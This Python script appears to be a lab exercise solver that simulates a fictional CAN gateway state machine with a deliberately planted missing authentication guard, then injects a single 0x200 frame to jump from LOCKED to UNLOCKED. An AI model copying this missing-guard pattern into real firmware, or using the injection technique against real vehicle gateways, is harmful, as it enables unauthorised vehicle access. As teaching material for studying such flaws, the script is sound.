#!/usr/bin/env python3
"""Lab 4 solver — Sentinel-2 CAN state machine injection.

The gateway state machine has a missing auth guard on the 0x200 session frame:
it is accepted from LOCKED as well as AUTH, letting an attacker jump straight to
UNLOCKED without authenticating.
"""
LOCKED, AUTH, UNLOCKED, DRIVE = 0, 1, 2, 3
NAME = {LOCKED: "LOCKED", AUTH: "AUTH", UNLOCKED: "UNLOCKED", DRIVE: "DRIVE"}


class Sentinel2:
    def __init__(self):
        self.state = LOCKED

    def process(self, frame_id: int, data: int) -> None:
        if frame_id == 0x100 and data == 0x01 and self.state == LOCKED:
            self.state = AUTH
        # BUG: 0x200 accepted from LOCKED too (guard should be state == AUTH only)
        if frame_id == 0x200 and data == 0x55 and self.state in (AUTH, LOCKED):
            self.state = UNLOCKED
        if frame_id == 0x300 and data == 0xAA and self.state == UNLOCKED:
            self.state = DRIVE


def normal_log():
    return [(0x100, 0x01), (0x200, 0x55), (0x300, 0xAA)]


def main():
    print("[*] normal session:")
    gw = Sentinel2()
    for fid, d in normal_log():
        gw.process(fid, d)
        print(f"    frame 0x{fid:X} 0x{d:02X} -> {NAME[gw.state]}")
    assert gw.state == DRIVE

    print("[*] injection (skip AUTH):")
    gw = Sentinel2()
    print(f"    start -> {NAME[gw.state]}")
    gw.process(0x200, 0x55)  # <-- the exploit frame
    print(f"    frame 0x200 0x55 -> {NAME[gw.state]}")
    assert gw.state == UNLOCKED, "injection failed: guard not bypassed"
    print("[+] OK — reached UNLOCKED without authentication (state-machine injection)")


if __name__ == "__main__":
    main()
